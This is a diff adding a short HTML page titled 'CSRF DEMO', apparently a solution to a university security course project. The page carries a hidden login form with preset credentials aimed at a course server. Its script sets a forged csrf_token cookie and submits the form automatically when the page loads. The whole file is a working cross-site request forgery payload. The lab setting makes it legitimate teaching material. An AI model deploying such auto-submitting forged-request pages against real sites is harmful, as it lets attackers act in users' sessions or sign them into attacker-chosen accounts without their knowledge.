@@ -1,0 +1,16 @@
+<html>
+	<head> <title> CSRF DEMO </title> </head>
+	<body>
+		<form  name="csrf_form" method="POST" action="http://cs526-s18.cs.purdue.edu/project3/login?csrfdefense=0&xssdefense=4">
+		<input type="hidden" name="username" value="aakanksha" />
+		<input type="hidden" name="password" value="123456" />
+
+		</form>
+		<script type="text/javascript">
+
+		document.cookie = "xssdefense=4; csrfdefense=1; csrf_token=81846fa40bf823739097bc70781c9fdc";
+		//alert(document.cookie);
+		document.csrf_form.submit();</script>
+		<iframe name="hiddenFrame" style="display:none;"> </iframe>
+	</body>
+</html>
